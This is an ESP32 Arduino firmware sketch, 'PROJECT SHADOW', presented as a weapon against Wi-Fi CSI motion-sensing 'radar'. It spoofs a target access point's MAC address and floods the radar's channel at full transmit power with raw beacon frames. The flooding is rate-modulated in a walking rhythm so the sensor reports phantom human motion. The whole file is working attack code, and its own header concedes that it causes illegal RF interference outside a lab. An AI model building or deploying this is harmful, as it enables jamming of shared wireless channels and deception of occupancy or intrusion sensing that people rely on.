/*
 * ═══════════════════════════════════════════════════════════════════════════
 * PROJECT SHADOW — Dynamic EW Deception Engine
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Injects a "digital ghost" into Wi-Fi CSI radar systems by flooding the
 * target channel with raw 802.11 beacon frames at rhythmically modulated
 * rates that mimic human walking patterns.
 *
 * HARDWARE: ESP32 DevKit (WROOM-32 or WROVER) + USB power bank
 * IDE:      Arduino IDE with ESP32 board support
 * BOARD:    "ESP32 Dev Module"
 *
 * *** LEGAL WARNING ***
 * This device intentionally generates RF interference. Use ONLY in
 * controlled laboratory environments for short demonstration bursts.
 * Violates FCC Part 15 / ETSI EN 300 328 if used improperly.
 *
 * HOW IT WORKS:
 * Unlike the naive approach of oscillating WiFi.setTxPower() (which only
 * affects this device's own signal strength and does NOT modulate the
 * radar's TX→RX channel), this firmware uses esp_wifi_80211_tx() to
 * inject raw 802.11 beacon frames directly into the air.
 *
 * The KEY mechanism is RATE MODULATION:
 *   - Bursts of packets are sent at a sinusoidally varying rate
 *   - Peak rate (~200 pkts/s) simulates a body directly in the radar path
 *   - Trough rate (~20 pkts/s) simulates the body moving away
 *   - Cycle period ~0.8–1.2s matches human gait cadence
 *   - Random jitter prevents artificial periodicity
 *
 * The RF energy from these packets creates multipath interference that
 * corrupts the CSI readings at the radar's receiver, making it report
 * motion in an empty room.
 *
 * ═══════════════════════════════════════════════════════════════════════════
 */

#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_err.h>
#include <math.h>

// ═══════════════════════════════════════════════════════════════════════════
// CONFIGURATION — Adjust these to match your radar setup
// ═══════════════════════════════════════════════════════════════════════════

// Wi-Fi channel of the ENEMY RADAR (MUST match exactly!)
#define RADAR_CHANNEL        6

// Gait simulation parameters
#define GAIT_CYCLE_MIN_MS    800    // Minimum gait cycle period (ms)
#define GAIT_CYCLE_MAX_MS    1200   // Maximum gait cycle period (ms)
#define BURST_RATE_PEAK      200    // Packets/sec at peak (close to radar)
#define BURST_RATE_TROUGH    20     // Packets/sec at trough (far from radar)

// Timing jitter range (milliseconds) — breaks artificial periodicity
#define JITTER_MIN_MS        5
#define JITTER_MAX_MS        30

// 🔴 TARGET TX MAC ADDRESS (CRITICAL)
// You MUST change this to the MAC address of your TX (Access Point) board.
// If this doesn't match, the Receiver board will ignore our weapon's packets!
uint8_t TARGET_TX_MAC[6] = {0xBC, 0xDD, 0xC2, 0xCC, 0x49, 0xF5};

// Status LED pin (built-in LED on most ESP32 DevKit boards)
#define LED_PIN              2

// TX Power level (0-20 dBm, use max for strongest effect)
#define TX_POWER_DBM         20

// SSID for the fake beacon frames (can be anything)
#define GHOST_SSID           "SHADOW_GHOST"

// Serial debug output
#define SERIAL_BAUD          115200
#define DEBUG_PRINT_INTERVAL 2000   // Print status every N ms

// ═══════════════════════════════════════════════════════════════════════════
// RAW 802.11 BEACON FRAME TEMPLATE
// ═══════════════════════════════════════════════════════════════════════════
//
// This is a minimal but valid 802.11 beacon frame that the ESP32 will
// transmit via esp_wifi_80211_tx(). The radar's receiver will pick up
// this RF energy as interference on its channel.

// Beacon frame structure:
// [Frame Control][Duration][Dest MAC][Src MAC][BSSID][Seq Ctrl]
// [Timestamp][Beacon Interval][Capabilities][SSID IE][Rates IE][Channel IE]

static uint8_t beacon_frame[] = {
    // ── MAC Header (24 bytes) ────────────────────────────────────────
    0x80, 0x00,                         // Frame Control: Beacon
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
    0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01, // Source MAC (fake)
    0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01, // BSSID (same as source)
    0x00, 0x00,                         // Sequence Control (auto-filled)

    // ── Beacon Body ──────────────────────────────────────────────────
    // Timestamp (8 bytes) — will be overwritten by hardware
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

    // Beacon Interval (2 bytes) — 100 TU (102.4 ms)
    0x64, 0x00,

    // Capability Information (2 bytes) — ESS
    0x01, 0x00,

    // ── Information Elements ─────────────────────────────────────────
    // SSID IE (Tag 0)
    0x00,                               // Element ID: SSID
    0x0C,                               // Length: 12 bytes
    // "SHADOW_GHOST" (12 chars)
    0x53, 0x48, 0x41, 0x44, 0x4F, 0x57, 0x5F, 0x47,
    0x48, 0x4F, 0x53, 0x54,

    // Supported Rates IE (Tag 1)
    0x01,                               // Element ID: Supported Rates
    0x08,                               // Length: 8
    0x82, 0x84, 0x8B, 0x96,             // 1, 2, 5.5, 11 Mbps (mandatory)
    0x0C, 0x12, 0x18, 0x24,             // 6, 9, 12, 18 Mbps

    // DS Parameter Set IE (Tag 3) — Channel
    0x03,                               // Element ID: DS Parameter Set
    0x01,                               // Length: 1
    0x06,                               // Channel number (will be updated)
};

static const int beacon_frame_len = sizeof(beacon_frame);


// ═══════════════════════════════════════════════════════════════════════════
// STATE VARIABLES
// ═══════════════════════════════════════════════════════════════════════════

static unsigned long cycle_count = 0;
static unsigned long total_packets_sent = 0;
static unsigned long last_debug_print = 0;
static unsigned long current_gait_period_ms = 1000; // Current cycle period
static float current_phase = 0.0;                    // Phase in gait cycle [0, 2π)
static bool led_state = false;

// Track time for the gait oscillation
static unsigned long cycle_start_time = 0;


// ═══════════════════════════════════════════════════════════════════════════
// HELPER FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

/**
 * Generate a random integer in [min_val, max_val] (inclusive).
 */
static int random_range(int min_val, int max_val) {
    if (min_val >= max_val) return min_val;
    return min_val + (esp_random() % (max_val - min_val + 1));
}

/**
 * Randomize the source MAC address in the beacon frame to prevent
 * the radar from filtering out a single static MAC.
 */
// static void randomize_mac() { ... } (Removed to support MAC Spoofing)

/**
 * Update the channel field in the beacon frame's DS Parameter Set IE.
 */
static void set_beacon_channel(uint8_t channel) {
    // The DS Parameter Set channel byte is the last byte of the frame
    beacon_frame[beacon_frame_len - 1] = channel;
}

/**
 * Blink the LED to indicate activity. Fast blink during peak,
 * slow blink during trough.
 */
static void update_led(float intensity) {
    // intensity: 0.0 (trough) to 1.0 (peak)
    // At peak: LED solid ON
    // At trough: LED blinks slowly
    if (intensity > 0.5) {
        digitalWrite(LED_PIN, HIGH);
        led_state = true;
    } else {
        // Toggle every ~200ms
        static unsigned long last_toggle = 0;
        unsigned long now = millis();
        if (now - last_toggle > 200) {
            led_state = !led_state;
            digitalWrite(LED_PIN, led_state ? HIGH : LOW);
            last_toggle = now;
        }
    }
}


// ═══════════════════════════════════════════════════════════════════════════
// SETUP
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    // ── Serial ───────────────────────────────────────────────────────
    Serial.begin(SERIAL_BAUD);
    delay(500);

    Serial.println();
    Serial.println("═══════════════════════════════════════════════════════");
    Serial.println("  PROJECT SHADOW — Dynamic EW Deception Engine");
    Serial.println("═══════════════════════════════════════════════════════");
    Serial.println();
    Serial.printf("  Target Channel : %d\n", RADAR_CHANNEL);
    Serial.printf("  Gait Cycle     : %d-%d ms\n", GAIT_CYCLE_MIN_MS, GAIT_CYCLE_MAX_MS);
    Serial.printf("  Burst Rate     : %d-%d pkt/s\n", BURST_RATE_TROUGH, BURST_RATE_PEAK);
    Serial.printf("  Jitter         : %d-%d ms\n", JITTER_MIN_MS, JITTER_MAX_MS);
    Serial.printf("  TX Power       : %d dBm\n", TX_POWER_DBM);
    Serial.println();

    // ── LED ──────────────────────────────────────────────────────────
    pinMode(LED_PIN, OUTPUT);
    digitalWrite(LED_PIN, HIGH);

    // ── Wi-Fi Initialization ─────────────────────────────────────────
    // We use WIFI_AP mode purely to activate the radio hardware.
    // No actual network is established or needed.
    WiFi.mode(WIFI_AP);
    delay(100);

    // Set the operating channel
    esp_wifi_set_channel(RADAR_CHANNEL, WIFI_SECOND_CHAN_NONE);
    Serial.printf("[SHADOW] Channel locked to %d\n", RADAR_CHANNEL);

    // Set TX power to maximum for strongest interference effect
    // esp_wifi_set_max_tx_power takes values in 0.25 dBm steps
    // 20 dBm = 80 in quarter-dBm units
    esp_wifi_set_max_tx_power(TX_POWER_DBM * 4);
    Serial.printf("[SHADOW] TX power set to %d dBm\n", TX_POWER_DBM);

    // ── MAC SPOOFING (CRITICAL) ──────────────────────────────────────
    // Inject the target TX MAC into our beacon frame template
    for (int i = 0; i < 6; i++) {
        beacon_frame[10 + i] = TARGET_TX_MAC[i]; // Source MAC
        beacon_frame[16 + i] = TARGET_TX_MAC[i]; // BSSID
    }
    Serial.printf("[SHADOW] Spoofing TX MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
        TARGET_TX_MAC[0], TARGET_TX_MAC[1], TARGET_TX_MAC[2], 
        TARGET_TX_MAC[3], TARGET_TX_MAC[4], TARGET_TX_MAC[5]);

    // Update channel in beacon frame
    set_beacon_channel(RADAR_CHANNEL);

    // Initialize gait cycle
    current_gait_period_ms = random_range(GAIT_CYCLE_MIN_MS, GAIT_CYCLE_MAX_MS);
    cycle_start_time = millis();

    Serial.println();
    Serial.println("[SHADOW] ████ WEAPON ARMED ████");
    Serial.println("[SHADOW] Deception engine running...");
    Serial.println();

    // Quick startup LED flash
    for (int i = 0; i < 5; i++) {
        digitalWrite(LED_PIN, HIGH);
        delay(100);
        digitalWrite(LED_PIN, LOW);
        delay(100);
    }

    last_debug_print = millis();
}


// ═══════════════════════════════════════════════════════════════════════════
// MAIN LOOP — Gait-Modulated Packet Flood
// ═══════════════════════════════════════════════════════════════════════════

void loop() {
    unsigned long now = millis();

    // ── Compute position in current gait cycle ───────────────────────
    unsigned long elapsed_in_cycle = now - cycle_start_time;

    if (elapsed_in_cycle >= current_gait_period_ms) {
        // Start a new gait cycle with randomized period
        cycle_count++;
        cycle_start_time = now;
        elapsed_in_cycle = 0;

        // Randomize the next cycle period (simulates natural gait variation)
        current_gait_period_ms = random_range(GAIT_CYCLE_MIN_MS, GAIT_CYCLE_MAX_MS);
    }

    // Phase: 0.0 to 1.0 within the current cycle
    float phase = (float)elapsed_in_cycle / (float)current_gait_period_ms;

    // Sinusoidal intensity: peaks at phase=0.25, troughs at phase=0.75
    // Using sin() to create smooth human-like motion pattern
    float intensity = 0.5 + 0.5 * sin(phase * 2.0 * PI);

    // ── Compute current packet rate ──────────────────────────────────
    // Interpolate between trough and peak rates based on intensity
    float current_rate = BURST_RATE_TROUGH + intensity * (BURST_RATE_PEAK - BURST_RATE_TROUGH);

    // Calculate delay between packets (microseconds)
    unsigned long packet_delay_us = (unsigned long)(1000000.0 / current_rate);

    // Add random jitter
    int jitter_ms = random_range(JITTER_MIN_MS, JITTER_MAX_MS);
    unsigned long jitter_us = (unsigned long)jitter_ms * 1000;

    // ── Transmit a burst of beacon frames ────────────────────────────
    // Send a small burst (3-8 packets) then pause
    int burst_size = 1 + (int)(intensity * 7); // 1 at trough, 8 at peak

    for (int i = 0; i < burst_size; i++) {
        // Inject the raw 802.11 beacon frame
        esp_err_t result = esp_wifi_80211_tx(
            WIFI_IF_AP,        // Interface: AP
            beacon_frame,      // Frame data
            beacon_frame_len,  // Frame length
            false              // Don't wait for ACK (beacon is broadcast)
        );

        if (result == ESP_OK) {
            total_packets_sent++;
        }

        // Short inter-packet delay within the burst
        delayMicroseconds(200); // 200µs between packets in a burst
    }

    // ── Inter-burst delay (rate-controlled) ──────────────────────────
    delayMicroseconds(packet_delay_us + jitter_us);

    // ── LED feedback ─────────────────────────────────────────────────
    update_led(intensity);

    // ── Debug output ─────────────────────────────────────────────────
    if (now - last_debug_print >= DEBUG_PRINT_INTERVAL) {
        Serial.printf(
            "[SHADOW] Cycle: %lu | Packets: %lu | Rate: %.0f pkt/s | "
            "Intensity: %.2f | Period: %lu ms\n",
            cycle_count,
            total_packets_sent,
            current_rate,
            intensity,
            current_gait_period_ms
        );
        last_debug_print = now;
    }
}
